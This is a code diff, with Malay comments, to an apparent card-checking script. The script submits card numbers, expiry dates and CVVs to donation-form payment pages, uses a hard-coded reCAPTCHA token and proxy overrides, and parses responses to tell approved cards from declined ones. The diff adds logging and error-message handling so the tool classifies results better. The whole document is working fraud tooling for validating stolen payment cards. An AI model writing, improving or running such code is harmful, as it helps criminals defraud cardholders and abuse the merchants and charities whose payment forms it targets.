@@ -310,6 +310,7 @@ def build_clean_payload(raw_payload, user_data, ccnum, mm, yy, cvv, qfkey, base_
     final_payload = {}
     
     final_payload["qfKey"] = qfkey
+    # FIX: Pastikan sentiasa & bukan &amp;
     final_payload["entryURL"] = base_url.replace("&amp;", "&")
     final_payload["g-recaptcha-response"] = "0cAFcWeA4PqJOMFj5mWJD9PmhlqErXn7af22ptYqSm9PWIfUuWBD4CuqXOChTMG-uxogsiJFzY-zd9ZErdAp8mAMgGVa491KAT417HoBZftbG2aTzzIuzJAYLSzxNXPrDmt8nWhuGeMt66_-KgexQ5WcpNrAQXaUofULifI4N05Xu-aGCbF1BvuU6AQKLs8j_muWRkHZQVYplfzk5PPirHB8en_yuWaKIMceUyBJaF1KcvjAf6dHyu48kaDHdHhoor16NdbkzRS0G6EoFhQm1ktHTFEDkkiFkVS5LWx7BK_MeaaZUpIzjOIAMHL3rX_1M-PwJjAxT_LbQ9sYjVoI_m_8sAKjdRoiHAzgZdyBdytGY9OJEVAUukVHGRU6tO15M9lYYhA5VzK4nD0dWeCfIk15U3TcAwZgdAcV036TnwfZMFfC636oW7SgQ0Q76xPLGYNxYI0JT3TR8nHnW-sqmXk8pZQ-3wR3Zy056eCjt-qyR9a-1hRmvcO-O9OvBPQpoEnT_0kNxXtEjAtbCvYz2iitwZoMX4iA7krPUGYUhku9VEQdyNkR_IW5S-DUypInmpqVy1DR0g7iGE4GccDpimMUHlr9VThWRDLS_mpBvRAVuOsjH7RaahI2xoXWZyIHQ0he2nsI-q-0hdJ_O5UVr1rPzWCYvEGu9ufhE6AhIMz1XKnO5mxHppZ6oCMzAW7jwPgwf4VBSJjWB4ym_YriAPEmq4su1ehRc21xtl03WlPLZyAqIwmSzNc5O6biV-bMVa7BQuBGZOILy4X3qQ-0O0byiscz729xXIN30L4hR5rv7zMP-WctzXSvLxkk9dWS2mpaD3msoBXZP4Ac6SkGf_TvG3YlOOEjfgTNnTT86tVhC11Ni9PXwl9m2kolOe7v_PmMhmgN-jE3IjxFWHxpCfN9_MfQk-jYJQ2s05tgXlPz4kh_4R6AWuuIozqsdIPI676qsiqkKFiQptp_NxaARq3KndEd4eS5Vh8GYEmgBBaE6o_KrWQRTG-E5WuA1X0CcpPLBk6RvroZdQGy9kwInxFEF9u9h4J3ja7tWqOqrnomaGzjC7AM3KoJvE3wXpU6EW_JLHUbXNSDfkjdDWMzM9bfiZ5NsWYnDQtXzHBYYtv6KVD-ziCCwAkG84RUBjLscQkJCe7Wn-Dujhe9W34cw6Sw8eeFroIEPAs_hsnJQabopNAWRNKnK49wYsVkrmV31D3OxGFNuQfFPR-PLzeIYb4yhAuwVehhGeOAFsp0RSVQssODPW6ncHgBXuL5hakVTl9ehyjIcaB6E5QzLrPFjIjGAMRUmaEzWzpO4R5Oq2S0CZZA-QxNInQjvH54iwT5BKbjdZYXY6xA2"
 
@@ -389,6 +390,8 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
             is_confirmation = '_qf_Confirm_display=true' in response.url or '_qf_Confirm_display=1' in response.url
             
             logging.info(f"URL Selepas Submit Pertama: {response.url}")
+            logging.info(f"Status Jumpa Confirm Button: {bool(confirm_btn)}")
+            logging.info(f"Status URL Confirmation: {is_confirmation}")
             
             if confirm_btn or is_confirmation:
                 input_qfkey = soup_resp.find('input', {'name': 'qfKey'})
@@ -429,7 +432,13 @@ def process_card_on_site(site_data, ccnum, mm, yy, cvv, override_proxy=None):
                 
                 result = parse_response(confirm_response.text, confirm_response.url)
             else:
-                result = parse_response(response.text, response.url)
+                # Jika tak masuk confirmation page, check sama ada ada error div di laman utama
+                error_div = soup_resp.find('div', class_=re.compile(r'error|messages|alert', re.I))
+                if error_div:
+                    err_text = error_div.get_text(separator=' ', strip=True)
+                    result = {'approved': False, 'has_msg': True, 'message': err_text, 'clean_response': err_text}
+                else:
+                    result = parse_response(response.text, response.url)
 
             if 'session has expired' in result.get('message', '').lower() or 'unable to complete' in result.get('message', '').lower():
                 if attempt < 2:
